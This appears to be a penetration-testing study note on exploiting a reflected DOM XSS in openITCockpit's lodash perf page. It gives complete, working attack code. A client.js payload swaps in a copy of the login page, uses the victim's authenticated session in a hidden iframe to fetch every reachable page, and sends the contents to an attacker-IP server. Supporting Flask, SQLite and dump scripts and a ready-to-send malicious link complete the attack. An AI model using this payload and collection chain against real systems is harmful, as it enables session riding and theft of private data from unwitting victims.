## Our Limitations
A reflected DOM based XSS gives us limited opportunities.
Unlike stored XSS, in reflected XSS, the vulnerable link, needs to be sent to the victim. Once the victim visits the page, the XSS will be triggered.

If we use Burp to inspect any of the requests and responses sent to and from the application, we may notice a cookie named _itnovum_.
This cookie is most likely used for sessions management.

![](../../03.%20Screenshots/t7-ss15.png)

We also see that the "http only" flag is set to true:

![](../../03.%20Screenshots/t7-ss16.png)

This means that we won't be able to access the user's session cookie using XSS.
While we won't have access to the user's session cookie, we do have access to the DOM, and we can control what is loaded and rendered on the web page with XSS.

When a user's browser, requests content from a webpage(triggered by refresh or js), the browser, will automatically include the session cookie, in the request(even if the JavaScript does not have access to the cookie value)

This would mean that we can add content's of the page, of the authenticated users, via XSS, that will only be accessible to the authenticated users and not the server.

Now, even though the JavaScript has the ability to manipulate the DOM, it does not mean we can control everything on the page.
The server has set restrictions to what the JavaScript can access, using the SOP(Same-Origin Policy).
The Same-Origin Policy, only allows resources from the same origin to communicate.
(For instance, if google.com wanted to load bing.com inside it. That would not be allowed)
(In an attacker's perspective, we cannot simply create a webpage, and manipulate the DOM to use our malicious webpage)

However, to bypass this we can rely on the fact, that the SOP allows JavaScript, running on the lodash page, to send a request, using XMLHttpRequest, or fetch to the openITCockpit server, and read the contents of the response.
This means we can load any page from the OpenITCockpit server, and retrieve it's contents.

**Why do this?**
The point of this exploitation, would be that if the victim of the XSS is already authenticated, they will have the access, and be able to load endpoints on the server that we cannot.
By this, we will be riding our victim's user session, to the server, instead of posing as the user(like in a normal session hijacking scenario).

**Client side limitations**
It is also important to note, that this session will only be available till the time our victim has the window with the XSS open.
This means we only get a small amount of time to perform the content discovery.

## Creating an Application
To run the following tasks, we will be creating our own application.
It will have 3 main components:
1. The xss payload script.
2. A Flask API server, to receive the contents of collected by the server
3. An SQLite database to store the collected content.


## Creating a Landing Page
We can manipulate the vulnerable page, using the Firefox developer tools:
For instance, we can start by querying for all "body" elements, and then access the index with 0:

![](../../03.%20Screenshots/t7-ss17.png)

We can store that in a variable, and use the innerHTML method, to access the contents of the body:

![](../../03.%20Screenshots/t7-ss18.png)

We can even edit the contents of the element:

![](../../03.%20Screenshots/t7-ss19.png)

Cool tip:
We can copy the source page of the homepage, and paste it inside backticks in the body.innerHTML variable.
This will lead to designing a page controlled by us, but with the vulnerable URL.


## Creating the Database
Even though we have a way to create a fake login page, we will need to create a database, where we can store whatever contents, we extract from the victim's session.
We will be creating an SQLite database for this.
We should be able to run the database script through the command line, moreover, both the API server and the script to dump the data, should be able to import functions from the database script.
We start by creating a script to initialize the database, and provide functions to insert data.

The script will have 4 main components:
1. To create a database
2. To insert content
3. To get content
4. To list the location of the content obtained

The script will look as follows:

```python
##Import Functions##
import base64
import sqlite3
import argparse
import os
from webbrowser import get

##Function to create the database connection##
def create_connection(db_file):
	conn = None
##Pass the filename into the sqlite3.connect() function##
	try:
		conn = sqlite3.connect(db_file)
	except Exception as e:
		print(e)
	return conn

##Function to create the database and tables##
def create_db(conn):
##Table will have 3 columns##
## 1. An integer that auto-increments as the primary key. ##
## 2. The location, in the form of a URL, that the content was obtained from. ##

#3. The content in form of blob
	createContentTable="""CREATE TABLE IF NOT EXISTS content (
			id integer PRIMARY KEY,
			location text NOT NULL,
			content blob);"""
	try:
		c = conn.cursor()
		c.execute(createContentTable)
	except Exception as e:
		print(e)

##Function to insert into database##
def insert_content(conn, loc1, cont1):
	params = (loc1, cont1)
	insertContent="""INSERT INTO content(location, content) VALUES(?, ?);"""
	try:
		c = conn.cursor()
		c.execute(insertContent, params)
		conn.commit()
		return c.lastrowid
	except Exception as e:
		return e

##Function to get contents from database##
def get_content(conn, loc2):
	getContent="""SELECT content FROM content WHERE location LIKE (?);"""
	params = ('%'+loc2+'%',)
	try:
		c = conn.cursor()
		c.execute(getContent, params)
		conn.commit()
		thecontent = c.fetchall() 
		return(thecontent)
	except Exception as e:
		return e

##Function to get location from database##
def get_locations(conn):
	getLocation="""SELECT location FROM content;"""
	try:
		c = conn.cursor()
		c.execute(getLocation)
		conn.commit()
		return c.fetchall()
	except Exception as e:
		return e

##Create the file to save the database##
if __name__ == "__main__":
	database = r"sqlite.db"
##Write the parser for the arguments##
	parser = argparse.ArgumentParser()
	group = parser.add_mutually_exclusive_group(required=True)
##Create the arguments##
	group.add_argument('--create','-c', help='Create Database', action='store_true')
	group.add_argument('--insert','-i', help='Insert Content', action='store_true')
	group.add_argument('--get','-g', help='Get Content', action='store_true')
	group.add_argument('--getLocations','-l', help='Get all Locations', action='store_true')
	parser.add_argument('--location','-L')
	parser.add_argument('--content','-C')
	args = parser.parse_args()


##Invoke the function for creating the database##
	conn = create_connection(database)
##Check if any arguments were called and call the appropriate function#
	if (args.create):
		print("[+] Creating Database")
		create_db(conn)
	elif (args.insert):
		if(args.location is None and args.content is None):
			parser.error("--insert requires --location, --content.")
		else:
			print("[+] Inserting Data")
			print(insert_content(conn, args.location, args.content))
	elif (args.get):
		if(args.location is None):
			parser.error("--get requires --location, --content.")
		else:
			print("[+] Getting Content")
			print(get_content(conn, args.location))
	if (args.getLocations):	
		print("[+] Getting All Locations")
		print(get_locations(conn))
```

## Creating the API

Now we will proceed to create the API that will collect the data sent from the user's browser and store it in the database.
We will build the application with flask.
We will import functions from our database script, and from flask and flask_cors modules.

We will use the flask_cors extension, to send the "CORS" header.
After imports are completed, we will start by defining the Flask app, and the CORS extension.
We will also set the Cross-Origin Resource Sharing header(CORS), as we will be calling the API server, using the XSS.
The CORS header will instruct the victim's browser, to allow XHR request to access resources from other origins.
In the case of the XSS we have discovered, we want to instruct the victim's browser to allow the XSS payload (running from https://openitcockpit) to be able to reach out to our API server to send the discovered content.
We will also define the database file we created.
Next, we will start our webserver.

We will also need to generate a self-signed certificate, and key.
This is because, openITCockPit, runs on HTTPS, and any modern browser will block mixed requests(HTTPS to HTTP).

![](../../03.%20Screenshots/t7-ss20.png)

With the self signed certificate and key generated, we can refer it in the app.run function, and specify a port for the API to run on.
With the Flask server ready, we need endpoints to run.
The first endpoint will be the contents of the login page, of OpenITCockPit server to allow the XSS to load our payload.

We'll use a python decorator to set the route.
We will send the client.js file with Flask's send_file function.

The final script will look as follows:

```python
##Import neccessary functions##
from locale import locale_alias
from flask import Flask, request, send_file
from flask_cors import CORS
import db

##Define the Flask API##
app = Flask(__name__)
CORS(app)

##use a python decorator to set the route for get requests##
@app.route('/client.js', methods=['GET'])
def clientjs():
	print("[+] Sending Payload")
	##use the client.js file##
	return send_file('./client.js', attachment_filename='client.js')

##use a python decorator to set the route for post requests##
@app.route("/ingest_content", methods=['POST'])
def ingest_content():
    data = request.values.to_dict()
    url = data['url']
    content = data['content']
    print("[+] Received content post-back!")
    print("\turl: %s" % (url))
    conn = db.create_connection(r"sqlite.db")
    db.insert_content(conn, url, content)
    conn.commit()
    return ('done')

##Run the API##
if __name__ == "__main__":
    app.run(host='0.0.0.0', port=443, ssl_context=('cert.pem', 'key.pem'))
```

Navigating to our attacker machine's IP, we see the contents of client.js:

![](../../03.%20Screenshots/t7-ss21.png)

## Scraping Content
Now that we have a web server to send our data to and a database to store the data, we need to finish the client.js script that targets the authenticated victim and will scrape the data they have access to

Our script will do the following tasks:
1.  Load the home page.
2.  Search for all unique links and save their hrefs.
3.  Fetch the content of each link.
4.  Send the content obtained from each link to our API server.

We know that the root of the application is a login page, which means, an authenticated session will lead to redirection to an authenticated page.
Even thought we will be using XHRs, to fetch the content of each link we find, we cannot use XHR on the home page, since we don't know if the page will add additional links to the DOM.

To solve this caveat, we will use an iframe, since it will load the page, follow any redirects and render the JavaScript.
Once the page is loaded, we can grab all the links the user has access to.

There are some more things to consider while building the script:
1. We will not follow any link that will log out the current session. Thus we will be avoiding words such as "logout" and "sign-out"
2. We don't want to scrape all links as soon as we open the iframe, this is because openITCOCKPIT already loads lots of JavaScript. This JavaScript, could potentially load additional content after the HTML is rendered that we do not want to miss out on, thus we will wait a few seconds after the page is fully loaded to ensure that everything is added to the DOM.

Our client.js script would look as follows:
```JavaScript

//Load the login page
allcontent = document.getElementsByTagName("html")[0]
allcontent.innerHTML = `<!DOCTYPE html>
<html lang="en">
<head>
    <!--[if IE]>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <![endif]-->
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>
        Login - open source system monitoring    </title>
    <link href="/favicon.ico?v3.7.2" type="image/x-icon" rel="icon"/><link href="/favicon.ico?v3.7.2" type="image/x-icon" rel="shortcut icon"/>    <link rel="stylesheet" type="text/css"
          href="/css/vendor/bootstrap/css/bootstrap.min.css?v3.7.2"/>
    <link rel="stylesheet" type="text/css"
          href="/smartadmin/css/font-awesome.min.css?v3.7.2"/>
    <link rel="stylesheet" type="text/css" href="/css/login.css?1664473603"/>

    <script type="text/javascript"
            src="/frontend/js/lib/jquery.min.js?v3.7.2"></script>
    <script type="text/javascript" src="/js/lib/particles.min.js?v3.7.2"></script>
    <script type="text/javascript" src="/js/login.js?1664473603"></script>


</head>
<body class="main">


    <div class="login-screen">
        <figure>
            <figcaption>Photo by SpaceX on Unsplash</figcaption>
        </figure>
        <figure>
            <figcaption>Photo by NASA on Unsplash</figcaption>
        </figure>
    </div>
<div class="container-fluid">
    <div class="row">
                    <div id="particles-js" class="col-xs-12 col-sm-6 col-md-7 col-lg-9"></div>
            </div>
</div>

<div class="login-center">
    <div class="min-height container-fluid">
        <div class="row">
            <div class="col-xs-12 col-sm-6 col-md-5 col-lg-3 col-sm-offset-6 col-md-offset-7 col-lg-offset-9">
                <div class="login" id="card">
                    <div class="login-alert">
                                                                    </div>
                    <div class="login-header">
                        <h1>openITCOCKPIT</h1>
                        <h4>Open source system monitoring</h4>
                    </div>
                    <div class="login-form-div">
                        <div class="front signin_form">
                            <p>Login</p>
                            <form action="/login/login" novalidate="novalidate" id="login-form" class="login-form" method="post" accept-charset="utf-8"><div style="display:none;"><input type="hidden" name="_method" value="POST"/></div>
                            
                            <div class="form-group">
                                <div class="input-group">
                                    <input name="data[LoginUser][username]" class="form-control" placeholder="Type your email or username" inputDefaults="  " type="text" id="LoginUserUsername"/>                                    <span class="input-group-addon">
                                        <i class="fa fa-lg fa-user"></i>
                                    </span>
                                </div>
                            </div>


                            <div class="form-group">
                                <div class="input-group">
                                    <input name="data[LoginUser][password]" class="form-control" placeholder="Type your password" inputDefaults="  " type="password" id="LoginUserPassword"/>                                    <span class="input-group-addon">
                                        <i class="fa fa-lg fa-lock"></i>
                                    </span>
                                </div>
                            </div>

                            <div class="checkbox">
                                <div class="checkbox"><input type="hidden" name="data[LoginUser][remember_me]" id="LoginUserRememberMe_" value="0"/><label for="LoginUserRememberMe"><input type="checkbox" name="data[LoginUser][remember_me]" class="" value="1" id="LoginUserRememberMe"/> Remember me on this computer</label></div>                            </div>

                            <div class="form-group sign-btn">
                                <button type="submit" class="btn btn-primary pull-right">
                                    Sign in                                </button>
                            </div>
                            </form>                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>


<div class="footer">
    <div class="container-fluid">
        <div class="row pull-right">
            <div class="col-xs-12">
                <a href="https://openitcockpit.io/" target="_blank" class="btn btn-default">
                    <i class="fa fa-lg fa-globe"></i>
                </a>
                <a href="https://github.com/it-novum/openITCOCKPIT" target="_blank" class="btn btn-default">
                    <i class="fa fa-lg fa-github"></i>
                </a>
                <a href="https://twitter.com/openITCOCKPIT" target="_blank" class="btn btn-default">
                    <i class="fa fa-lg fa-twitter"></i>
                </a>
            </div>
        </div>
    </div>
</div>



<div class="container">
    <div class="row">
        <div class="col-xs-12">
                    </div>
    </div>
</div>
</body>
</html>
`
//Create the full-page iframe element
var iframe = document.createElement('iframe');
//don't want to show any loading of page to victim so display set to none
iframe.setAttribute("style","display:none")
//
iframe.onload = actions;
iframe.width = "100%"
iframe.height = "100%"
//set the source to root of openitcockpit page
iframe.src = "https://openitcockpit"

body = document.getElementsByTagName('body')[0];
body.appendChild(iframe)

//create function for the timeout
function actions(){
    setTimeout(function(){ getContent() }, 5000);
}

//function to get content
function getContent(){
	//grab all the a elements from the iframe
	allA = iframe.contentDocument.getElementsByTagName("a")

	//put the collection of the links in an array, extract the href tags and remove duplicate links
	allHrefs = []
	for (var i=0; i<allA.length; i++){
	    allHrefs.push(allA[i].href)
	}
	//convert the HTML collection of unique values, to an array
	uniqueHrefs = _.unique(allHrefs)

	//create a new array for valid URLs
	validUniqueHrefs = []
	//loop throught the unique and valid Hrefs
	for(var i=0; i<uniqueHrefs.length; i++){
		//check if the URL is valid and verify that it won't log out the target
		if (validURL(uniqueHrefs[i])){
			validUniqueHrefs.push(uniqueHrefs[i])
			}
		}  
	validUniqueHrefs.forEach(href =>{
		//use fetch with each valid link and unique href
		//the fetch method will return a javascript promise.
	    fetch(href, {
		        "credentials": "include",
		        "method": "GET",
	    })
		    //sstore the response
		    .then((response) => {
			    return response.text()
	    })
		    //encode and send the response to our API
		    .then(function (text){
			      fetch("https://<attacker IP>/content", {
		        body: "url=" + encodeURIComponent(href) + "&content=" + encodeURIComponent(text),
		        headers: {
		        "Content-Type": "application/x-www-form-urlencoded"
	        },
		        method: "POST"
	      })
	    });
	})
}
```

A promise handles an asynchronous operations once they complete or fail.
Instead of blocking our entire thread as the code executes, a function passed into the promise, will be executed once the promise is complete.
This also allows to tie multiple promises, to ensure a method only executes after the promise completes.

In the code above, the promise returned by the fetch function, is handled by the "then" function, where the response is the passed argument.
The text from the response is obtained, and passed into another "then" function, where the text is sent to the API server, along with the source URL of the content.

## Dumping The Contents
We've carried out all 3 steps, however, to make things easier, we'll create one last python script, that dumps the contents into a file to fetch it easily.
The script will import and expand on our database script.

```python
##import necessary libs and modules##
import os
from db import create_connection, get_content, get_locations

##set the database##
database = r"sqlite.db"
##set the directory to place the files into##
contentDir = os.getcwd() + "/content"

##Create the write_to_file() function##
def write_to_file(url, content):
	##replace the prefix of url with null#
	fileName = url.replace('https://','')
	##if the filename does not end with .html, put the same##
	if not fileName.endswith(".html"):
		fileName = fileName + ".html"
	##store the content of each location into a file##
	fullname = os.path.join(contentDir, fileName)
	path, basename = os.path.split(fullname)
	##if a subdirectory from url does not exist locally, create a same local one##
	if not os.path.exists(path):
		os.makedirs(path)
	##write the content to it##
	with open(fullname, 'w') as f:
		f.write(content)

##Create the main section##
if __name__ == '__main__':
	##make the connection##
	conn = create_connection(database)
	##query all locations##
	locations = get_locations(conn)
	##for each location, query the content, and use write_to_file function##
	for l in locations:
		content = get_content(conn, l[0])
		write_to_file(l[0], str(content))
``` 

## Exploitation

With everything in place, we can start off by creating a database with our database script:

![](../../03.%20Screenshots/t7-ss22.png)

With the database created, we'll run our API server:

![](../../03.%20Screenshots/t7-ss23.png)

With our server running, we'll send the link with the payload to the victim, and wait for them to open it, with their authenticated session:

```url
http://openitcockpit/js/vendor/lodash/perf/index.html?build=http://<attacker IP>/client.js
```

Once, the user opens the link with their authenticated session, we can see it in our logs, as our database starts getting populated:

![](../../03.%20Screenshots/t7-ss24.png)

With the database populated, we can now dump the contents using our dump script:

![](../../03.%20Screenshots/t7-ss25.png)

With all the data dumped, we can access it using the contents folder we mentioned in the script:

![](../../03.%20Screenshots/t7-ss26.png)